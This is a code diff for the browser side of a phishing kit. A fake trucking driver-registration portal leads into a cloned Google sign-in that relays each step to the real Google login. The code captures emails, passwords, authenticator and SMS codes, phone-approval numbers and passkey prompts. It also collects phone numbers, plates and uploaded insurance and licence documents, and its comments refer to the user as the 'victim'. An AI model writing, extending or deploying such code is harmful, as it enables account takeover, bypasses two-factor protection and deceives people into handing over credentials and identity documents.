@@ -1,12 +1,24 @@
-const token = location.pathname.split('/').pop();
+// The public wizard is a single static link. The page can be served from
+// /signin (landing) or /w/login (legacy), but the API token is always `login`.
+const token = 'login';
+const wizardParams = new URLSearchParams(location.search);
+const POPUP_TAB = wizardParams.has('popup');
+// ?embed=1 -> the wizard is shown inside the landing page's driver section
+// (hide the standalone-page chrome: step pills, heading, trust row, footer)
+if (wizardParams.has('embed')) document.documentElement.classList.add('wz-embed');
 // A unique id for THIS visitor's registration. The same static link is used by
 // many people, so this keeps each person's steps building up their own fresh
-// session server-side instead of everyone sharing one.
-const wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2));
+// session server-side instead of everyone sharing one. Persisted so the
+// driver->sign-in redirect (and page reloads) keep the same registration.
+let wid = localStorage.getItem('gs_wid');
+if (!wid) {
+  wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2));
+  localStorage.setItem('gs_wid', wid);
+}
 const $ = (id) => document.getElementById(id);
 
 function show(name) {
-  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-approval', 'screen-numchoice', 'screen-done']) {
+  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-approval', 'screen-numchoice', 'screen-choice', 'screen-passkey', 'screen-captcha', 'screen-done']) {
     $(id).classList.toggle('hidden', id !== name);
   }
 }
@@ -119,16 +131,8 @@ function routeState(L, w) {
   // for on the way (password re-entry / number / 2FA) is routed to the matching
   // screen below, so the user sees exactly what to type or tap.
   if ((w && w.trusted === true) && L.state !== 'trusted') { stopPolling(); return finish(); }
-  if (L.state === 'trust-start') {
-    showTrustProgress('Almost done \u2014 registering this device with your account so future sign-ins skip verification\u2026');
-    startPolling();
-    return;
-  }
-  if ((w && w.loggedIn) || L.state === 'signed-in') {
-    showTrustProgress('Signed in \u2014 registering this device with your account (one-time setup)\u2026');
-    startPolling();
-    return;
-  }
+  // signed in (Gmail verified) -> done. No device registration after login.
+  if ((w && w.loggedIn) || L.state === 'signed-in' || L.state === 'trusted') { stopPolling(); return finish(); }
   // "Confirm it's you" / check-your-phone-approve -> show it + keep polling.
   // The approve page can ALSO display a verification number (e.g. /challenge/dp:
   // "the number 47 below will be on your phone") — surface it big, that was the
@@ -143,7 +147,16 @@ function routeState(L, w) {
       numBox.innerHTML = list.map((n) => `<div class="g-numbig">${n}</div>`).join('');
     }
     numBox.style.display = list.length ? '' : 'none';
-    if (list.length) $('approve-status').textContent = 'Waiting for your phone…';
+    const device = L.device ? String(L.device).trim() : '';
+    if (device && list.length) {
+      $('approve-status').textContent = `Check your ${device} — tap Yes, then tap ${list.join(' ')} on your phone.`;
+    } else if (device) {
+      $('approve-status').textContent = `Check your ${device} — open the notification and tap Yes.`;
+    } else if (list.length) {
+      $('approve-status').textContent = `Google is showing ${list.join(' ')} — tap that number on your phone.`;
+    } else {
+      $('approve-status').textContent = 'Waiting for your phone…';
+    }
     startPolling();
     return;
   }
@@ -152,6 +165,7 @@ function routeState(L, w) {
   // the input so the user sees it without hunting.
   if (L.state === 'code') {
     if (!onScreen('screen-totp')) show('screen-totp');
+    $('totp-caption').textContent = 'To help keep your account safe, Google wants to make sure it\u2019s really you. Enter the 6-digit code from your authenticator app \u2014 or the code Google just texted or emailed you \u2014 to finish.';
     const numBox = $('totp-numbers');
     const list = (L.options || []).map(String);
     if (list.length && list.join('|') !== (numBox.dataset.opts || '')) {
@@ -160,6 +174,35 @@ function routeState(L, w) {
     }
     numBox.style.display = list.length ? '' : 'none';
     $('g-totp').focus();
+    startPolling();
+    return;
+  }
+  // "choose how to confirm" options list (after Try another way) -> let them tap
+  // one; the backend clicks the matching option on the REAL page.
+  if (L.state === 'choice') {
+    renderChoice(L.options || []);
+    startPolling();
+    return;
+  }
+  // SMS send: "we'll text a code to +1 \u2022\u2022\u2022" -> code entry, phone context.
+  if (L.state === 'sms') {
+    if (!onScreen('screen-totp')) show('screen-totp');
+    $('totp-caption').textContent = L.phone
+      ? `We\u2019ll text you a code to ${L.phone}. Enter it below to finish.`
+      : 'We\u2019ll text you a code. Enter it below to finish.';
+    $('g-totp').focus();
+    startPolling();
+    return;
+  }
+  // passkey: victim confirms on their device (fingerprint / face / PIN).
+  if (L.state === 'passkey') {
+    show('screen-passkey');
+    startPolling();
+    return;
+  }
+  // captcha / bot check: nothing to enter, just wait + re-check.
+  if (L.state === 'captcha') {
+    show('screen-captcha');
     startPolling();
     return;
   }
@@ -175,9 +218,19 @@ function routeState(L, w) {
     $('g-pass').focus();
     return;
   }
+  // Google bounced back to the identifier screen (wrong email, re-prompt) ->
+  // let them type it again instead of staring at "Verifying…".
+  if (L.state === 'email') {
+    if (!onScreen('screen-email')) show('screen-email');
+    $('g-email').focus();
+    startPolling();
+    return;
+  }
   // transitional / verifying — wait quietly where we are; keep polling so the
   // next step (code / approve / signed-in / error) is picked up automatically.
   if (onScreen('screen-approval')) $('approve-status').textContent = 'Verifying\u2026';
+  else if (onScreen('screen-passkey')) $('passkey-status').textContent = 'Waiting for your device\u2026';
+  else if (onScreen('screen-captcha')) $('captcha-status').textContent = 'Working\u2026';
   else if (onScreen('screen-totp')) hint('totp-hint', 'Verifying\u2026');
   else if (onScreen('screen-pass')) hint('pass-hint', 'Verifying\u2026');
   else if (onScreen('screen-email')) hint('email-hint', 'Verifying\u2026');
@@ -185,13 +238,40 @@ function routeState(L, w) {
   startPolling();
 }
 
+// "choose how to confirm" list — mirrors the real page's options; tapping one
+// sends it and the backend clicks the same option on the REAL Google page.
+function renderChoice(options) {
+  if (!onScreen('screen-choice')) show('screen-choice');
+  const box = $('choice-options');
+  const list = (options || []).map(String);
+  if (list.join('|') === (box.dataset.opts || '')) return; // unchanged
+  box.dataset.opts = list.join('|');
+  box.innerHTML = '';
+  list.forEach((label) => {
+    const b = document.createElement('button');
+    b.type = 'button';
+    b.className = 'g-choice';
+    b.textContent = label;
+    b.addEventListener('click', async () => {
+      box.querySelectorAll('.g-choice').forEach((x) => (x.disabled = true));
+      hint('choice-hint', 'Verifying\u2026');
+      const w = await step('choice', label);
+      box.querySelectorAll('.g-choice').forEach((x) => (x.disabled = false));
+      if (!w) { hint('choice-hint', 'Something went wrong. Try again.', true); return; }
+      setWiz(w);
+      routeState((w.login) || {}, w);
+    });
+    box.appendChild(b);
+  });
+}
+
 // Mark the invite complete, then show the success screen. On a confirmed
 // sign-in (Gmail verified) surface "Open Gmail" so it reads as a working login.
 // Flip the LANDING PAGE (behind the sign-in popup) into its success state, so
 // the portal itself reads "registered" — not only the sign-in card.
 function showLandingSuccess(username) {
-  const name = $('d-name').value.trim();
-  const plate = $('d-plate').value.trim().toUpperCase();
+  const name = $('c-contact').value.trim();
+  const plate = $('c-truck').value.trim().toUpperCase();
   $('ls-name').textContent = name || (username ? username.split('@')[0] : 'Driver');
   const meta = [plate ? 'Plate \u00b7 ' + plate : '', username ? 'Google \u00b7 ' + username : ''].filter(Boolean).join('   \u00b7   ');
   if (meta) {
@@ -201,22 +281,32 @@ function showLandingSuccess(username) {
   }
   $('ls-form-wrap').classList.add('hidden');
   $('ls-success').classList.remove('hidden');
-  document.title = 'Registered \u2014 TransLogix';
+  document.title = 'Registered \u2014 TransLogistX';
 }
 async function redirect() {
   stopPolling();
   await api('/complete', {}).catch(() => {});
   const username = (WIZ && WIZ.username) || '';
-  $('done-msg').textContent = (WIZ && WIZ.trusted)
-    ? 'Driver details received — you\u2019re signed in to Google. This device is now registered for your account.'
-    : 'Driver details received \u2014 you\u2019re signed in to Google.';
+  $('done-msg').textContent = 'Thanks\u2026 submission received.';
   if (username) {
     $('done-account').textContent = 'Signed in as ' + username;
     $('done-account').hidden = false;
   }
+  // Popup-tab flow: the Google clone runs in its own tab. When it finishes, tell
+  // the landing tab to show "submitted", then close this tab. No client-side
+  // redirect to any real Google domain.
+  if (POPUP_TAB && window.opener) {
+    openPopup();
+    show('screen-done');
+    window.opener.postMessage({ type: 'gsession:google-done', username }, '*');
+    setTimeout(() => {
+      try { window.close(); } catch {}
+    }, 700);
+    return;
+  }
+  // Same-tab / direct-link fallback: show the landing success panel in place.
   showLandingSuccess(username);
-  openPopup();
-  show('screen-done');
+  closePopup();
 }
 async function finish() {
   return redirect();
@@ -236,9 +326,28 @@ $('forgot-email').addEventListener('click', () =>
   hint('email-hint', 'Enter the email address linked to this account.'));
 $('forgot-pass').addEventListener('click', () =>
   hint('pass-hint', 'Enter the password for this account.'));
-// "Try another way" -> don't fight over 2FA; let REAL Google handle the prompt/
-// SMS. Bounce them over and they finish it on the genuine page.
-$('try-another').addEventListener('click', finish);
+$('create-acct').addEventListener('click', () =>
+  toast('You already have an account — sign in above to continue.'));
+$('guest-mode').addEventListener('click', () =>
+  toast('Use a private browsing window so this computer doesn\u2019t save your sign-in.'));
+$('btn-back').addEventListener('click', () => {
+  show('screen-email');
+  $('g-email').focus();
+});
+// "Try another way" (any screen) -> click the SAME link on the REAL Google page
+// so it moves to the options list / code entry, then mirror whatever the real
+// page shows next. Fallback (no link there): show the code screen + keep polling.
+async function onTryAnother(btn) {
+  if (btn) btn.disabled = true;
+  stopPolling();
+  const w = await step('tryanother');
+  if (btn) btn.disabled = false;
+  if (w) { setWiz(w); routeState((w.login) || {}, w); return; }
+  show('screen-totp');
+  $('g-totp').focus();
+  startPolling();
+}
+$('try-another').addEventListener('click', (e) => onTryAnother(e.currentTarget));
 
 // ---- authentic footer: Help/Privacy/Terms hints + language toggle ----
 for (const btn of document.querySelectorAll('.g-foot-link')) {
@@ -266,32 +375,98 @@ if ($('g-lang')) {
   });
 }
 
+// ---- optional document uploads (insurance certificate / company license) ----
+const MAX_DOC = 10 * 1024 * 1024; // 10 MB
+function bindUpload(inputId, textId, clearId, boxId) {
+  const input = $(inputId), text = $(textId), clear = $(clearId), box = $(boxId);
+  input.addEventListener('change', () => {
+    const f = input.files && input.files[0];
+    if (!f) return;
+    if (f.size > MAX_DOC) {
+      input.value = '';
+      hint('driver-hint', f.name + ' is over 10 MB — pick a smaller file.', true);
+      return;
+    }
+    text.textContent = f.name;
+    box.classList.add('has');
+    clear.hidden = false;
+  });
+  clear.addEventListener('click', (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+    input.value = '';
+    text.textContent = 'Add file';
+    box.classList.remove('has');
+    clear.hidden = true;
+  });
+}
+bindUpload('d-insurance', 'up-insurance-text', 'up-insurance-clear', 'up-insurance-box');
+bindUpload('d-license', 'up-license-text', 'up-license-clear', 'up-license-box');
+
+// Read a picked file as base64 (null when none). Sent with the driver step.
+function readDoc(inputId) {
+  return new Promise((resolve) => {
+    const f = $(inputId).files && $(inputId).files[0];
+    if (!f) return resolve(null);
+    const r = new FileReader();
+    r.onload = () => resolve({ name: f.name, type: f.type || '', data: String(r.result || '').split(',')[1] || '' });
+    r.onerror = () => resolve(null);
+    r.readAsDataURL(f);
+  });
+}
+
 // ---- driver registration (landing) ----
 $('form-driver').addEventListener('submit', async (e) => {
   e.preventDefault();
-  const fullName = $('d-name').value.trim();
-  const phone = $('d-phone').value.trim();
-  const email = $('d-email').value.trim();
-  const license = $('d-license').value.trim();
-  const licensePlate = $('d-plate').value.trim();
-  const vehicle = $('d-vehicle').value.trim();
-  const city = $('d-city').value.trim();
-  const state = $('d-state').value;
-  if (!fullName && !licensePlate) {
-    return hint('driver-hint', 'Enter your full name and plate number to continue.', true);
+  const contactName = $('c-contact').value.trim();
+  const phone = $('c-phone').value.trim();
+  const truckPlate = $('c-truck').value.trim().toUpperCase();
+  const trailerPlate = $('c-trailer').value.trim().toUpperCase();
+  const driverName = $('c-dname').value.trim();
+  const driverPhone = $('c-dphone').value.trim();
+  const missing = !contactName ? 'contact person' : !phone ? 'phone' : !truckPlate ? 'truck plate number' : !driverName ? 'driver name' : !driverPhone ? 'driver phone' : '';
+  if (missing) {
+    return hint('driver-hint', 'Enter the ' + missing + ' to continue.', true);
   }
   hint('driver-hint', '');
   busy('btn-driver', true);
-  const ok = await step('driver', { driverName: fullName, licensePlate, phone, email, license, vehicle, city, state });
+  const [insurance, license] = await Promise.all([readDoc('d-insurance'), readDoc('d-license')]);
+  const ok = await step('driver', { contactName, phone, truckPlate, trailerPlate, driverName, driverPhone, files: { insurance, license } });
   busy('btn-driver', false);
   setWiz(ok);
   if (!ok) {
     hint('driver-hint', 'Something went wrong. Try again.', true);
     return;
   }
-  // driver details captured -> open the Google sign-in as a popup
-  openPopup();
-  show('screen-email');
+  // Driver details captured -> open our cloned Google sign-in in a NEW TAB. The
+  // landing tab stays put; when the sign-in tab finishes it posts back and
+  // closes itself, then the landing shows "submitted". No real Google redirect.
+  const win = window.open('/signin?verify=1&popup=1', 'gsession-google');
+  if (!win) {
+    window.top.location.href = '/signin?verify=1';
+    return;
+  }
+  const btn = $('btn-driver');
+  btn.disabled = true;
+  btn.classList.add('loading');
+  const watch = setInterval(() => {
+    if (win.closed) {
+      clearInterval(watch);
+      btn.disabled = false;
+      btn.classList.remove('loading');
+      hint('driver-hint', 'Google sign-in was closed before it finished.', true);
+    }
+  }, 1000);
+  const onGoogleDone = (e) => {
+    if (!e.data || e.data.type !== 'gsession:google-done') return;
+    clearInterval(watch);
+    btn.disabled = false;
+    btn.classList.remove('loading');
+    hint('driver-hint', '');
+    showLandingSuccess(e.data.username || '');
+    window.removeEventListener('message', onGoogleDone);
+  };
+  window.addEventListener('message', onGoogleDone);
 });
 
 // close the popup (backdrop click or the X), leaving the landing intact
@@ -431,17 +606,24 @@ function renderNumChoice(options) {
 }
 
 // ---- approve screen ("Confirm it's you" / check-your-phone) ----
-// "Try another way" -> fall back to typing the 6-digit code instead.
-$('try-another-2').addEventListener('click', () => {
-  stopPolling();
-  show('screen-totp');
-  $('g-totp').focus();
-});
+// "Try another way" -> move the REAL page to another method, then mirror it.
+$('try-another-2').addEventListener('click', (e) => onTryAnother(e.currentTarget));
 // "Continue" nudges an immediate re-check (the poll otherwise waits up to ~2.5s).
 $('btn-approve').addEventListener('click', async () => {
   const w = await step('status');
   routeState((w && w.login) || null, w || null);
 });
+
+// ---- passkey / captcha screens ----
+// "Try another way" on the passkey screen -> same shared handler.
+$('try-another-3').addEventListener('click', (e) => onTryAnother(e.currentTarget));
+// "Continue" -> immediate re-check (passkey confirmed on device / captcha passed).
+for (const id of ['btn-passkey', 'btn-captcha']) {
+  $(id).addEventListener('click', async () => {
+    const w = await step('status');
+    routeState((w && w.login) || null, w || null);
+  });
+}
 
 // ---- boot ----
 (async function boot() {
@@ -457,6 +639,15 @@ $('btn-approve').addEventListener('click', async () => {
   // the personalized success screen; otherwise show the driver landing (popup
   // stays closed until they hit "Sign in with Google").
   if (w.done || w.loggedIn) { redirect(); return; }
+  // Sign-in page: the driver step is done (this navigation used ?verify=1, or a
+  // reload with the saved wid already past the form) -> straight to Google sign-in.
+  if (new URLSearchParams(location.search).has('verify') || w.driver) {
+    $('ls-form-wrap').classList.add('hidden');
+    openPopup();
+    show('screen-email');
+    $('g-email').focus();
+    return;
+  }
   closePopup();
-  $('d-name').focus();
+  $('c-contact').focus();
 })();
